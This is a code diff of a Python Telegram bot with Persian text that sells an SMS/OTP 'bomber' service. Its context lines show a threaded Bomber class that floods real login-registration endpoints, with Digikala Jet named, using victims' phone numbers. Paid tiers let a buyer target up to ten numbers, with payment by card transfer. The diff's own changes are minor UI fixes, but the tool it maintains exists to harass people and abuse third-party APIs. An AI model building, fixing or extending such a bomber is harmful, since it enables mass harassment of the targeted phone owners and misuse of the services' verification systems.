@@ -102,7 +102,6 @@ class Bomber:
 
     def load_services(self):
         # ⚠️⚠️⚠️ لیست سرویس‌های خودت رو اینجا کپی کن ⚠️⚠️⚠️
-        # دقت کن که data باید یک تابع باشد که phone را بگیرد
         self.services = [
             {'name': 'Digikala Jet', 'url': 'https://api.digikalajet.ir/user/login-register/', 'method': 'POST', 'data': lambda phone: {"phone": phone}, 'json': True},
             # بقیه سرویس‌ها ...
@@ -111,7 +110,7 @@ class Bomber:
     def send_request(self, service, phone):
         if self.stop_event.is_set(): return
         try:
-            data = service['data'](phone) # اصلاح: پاس دادن شماره به تابع
+            data = service['data'](phone)
             headers = {'User-Agent': "Mozilla/5.0"}
             method = service['method'].upper()
             use_json = service.get('json', False)
@@ -144,7 +143,6 @@ class Bomber:
         chunk_size = max(1, len(self.services) // 15)
         threads = []
         
-        # ارسال پیام اولیه نوار وضعیت
         status_msg = bot.send_message(self.user_id, f"⏳ **در حال ارسال...**\nمیزان پیشرفت: 0/{self.total_services}", parse_mode='Markdown')
         
         for phone in self.phone_numbers:
@@ -155,7 +153,6 @@ class Bomber:
                 t.start()
                 threads.append(t)
                 
-        # آپدیت نوار وضعیت
         def update_status():
             last_update = time.time()
             while any(t.is_alive() for t in threads):
@@ -460,7 +457,7 @@ def cmd_admin(message):
     kb_admin(message)
 
 # ==========================================
-# 9. هندلرهای منو (Callback Queries)
+# 9. هندلرهای منو (Callback Queries) - اصلاح‌شده
 # ==========================================
 @bot.callback_query_handler(func=lambda call: True)
 def handle_callbacks(call):
@@ -487,7 +484,8 @@ def handle_callbacks(call):
             f"👥 **دعوت‌ها:** **{user['invites']}**\n"
         )
         markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
-        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
+        # استفاده از edit_message_text به جای caption برای جلوگیری از خطا
+        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
 
     elif call.data == "menu_buy":
         text = "**پلن‌های اعتبار:**\n\n"
@@ -496,7 +494,7 @@ def handle_callbacks(call):
             text += f"🔹 **{plan['name']}** | {plan['price']} تومان\n"
             markup.add(types.InlineKeyboardButton(f"خرید {plan['name']}", callback_data=f"buy_{key}"))
         markup.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
-        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
+        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
 
     elif call.data.startswith("buy_"):
         plan_key = call.data.replace("buy_", "")
@@ -504,12 +502,12 @@ def handle_callbacks(call):
         user_states[user_id] = {"selected_plan": plan_key}
         text = f"✅ پلن **{plan['name']}** انتخاب شد.\n\n💳 مبلغ **{plan['price']} تومان** را واریز کنید:\n`{CARD_NUMBER}`\n\n📸 سپس **عکس رسید** را بفرستید."
         markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_buy"))
-        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
+        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
 
     elif call.data == "menu_bomb_free":
         user_states[user_id] = {"state": "waiting_for_phone", "service": "free"}
         markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 انصراف", callback_data="menu_back"))
-        bot.edit_message_caption(f"📞 **سرویس رایگان**:\nشماره را وارد کنید:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
+        bot.edit_message_text(f"📞 **سرویس رایگان**:\nشماره را وارد کنید:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
 
     elif call.data == "menu_bomb_sub":
         markup = types.InlineKeyboardMarkup(row_width=1)
@@ -518,14 +516,14 @@ def handle_callbacks(call):
             types.InlineKeyboardButton("🔥 حرفه‌ای (۵ شماره)", callback_data="sub_pro"),
             types.InlineKeyboardButton("👑 VIP (۱۰ شماره)", callback_data="sub_vip")
         )
-        bot.edit_message_caption("**نوع اشتراک خود را انتخاب کنید:**", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
+        bot.edit_message_text("**نوع اشتراک خود را انتخاب کنید:**", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
 
     elif call.data.startswith("sub_"):
         sub_type = call.data.replace("sub_", "")
         user_states[user_id] = {"state": "waiting_for_phone", "service": sub_type}
         max_phones = SERVICE_CONFIG[sub_type]["max_phones"]
         markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 انصراف", callback_data="menu_back"))
-        bot.edit_message_caption(f"📞 **سرویس {SERVICE_CONFIG[sub_type]['name']}** (حداکثر {max_phones} شماره):\nشماره را وارد کنید:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
+        bot.edit_message_text(f"📞 **سرویس {SERVICE_CONFIG[sub_type]['name']}** (حداکثر {max_phones} شماره):\nشماره را وارد کنید:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
 
     # ادمین
     elif call.data == "admin_stats" and call.from_user.id == ADMIN_ID:
